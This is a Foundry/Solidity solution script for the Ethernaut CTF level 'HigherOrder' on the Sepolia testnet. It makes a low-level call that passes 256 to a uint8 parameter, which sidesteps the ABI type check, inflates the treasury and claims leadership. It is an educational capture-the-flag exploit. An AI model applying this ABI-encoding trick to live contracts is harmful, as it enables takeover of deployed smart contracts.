// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

/*
    Solution script for the Ethernaut Level 9: HigherOrder

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in HigherOrderScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/HigherOrder.s.sol:HigherOrderScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/HigherOrder.s.sol/11155111
*/

interface IHigherOrder {
    function commander() external view returns (address);
    function treasury() external view returns (uint256);
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}

contract HigherOrderScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x5A89B949b5902C24c52544B7FC4bf6B89522Fc59;
    IHigherOrder level30 = IHigherOrder(instance);

    function run() external {
        vm.startBroadcast();
        
        /*
            Solution here is to simply makea  low level call to the function passing the desired data as we like
            The type checks at the ABI are not applied and so we can use this approach to set the value of the treasury
            to any number up to uint256.max
        */
        address(level30).call(
            abi.encodeWithSignature("registerTreasury(uint8)", 256)
        );

        require(level30.treasury() == 256, "Treasury should be 256");
        level30.claimLeadership();

        // console.log("Treasury: ", level30.treasury());
        // console.log("Commander: ", level30.commander());

        // if the player is not the commander then we have failed so revert
        require(level30.commander() == msg.sender, "Player is not the commander of the higher order!");

        vm.stopBroadcast();
    }
}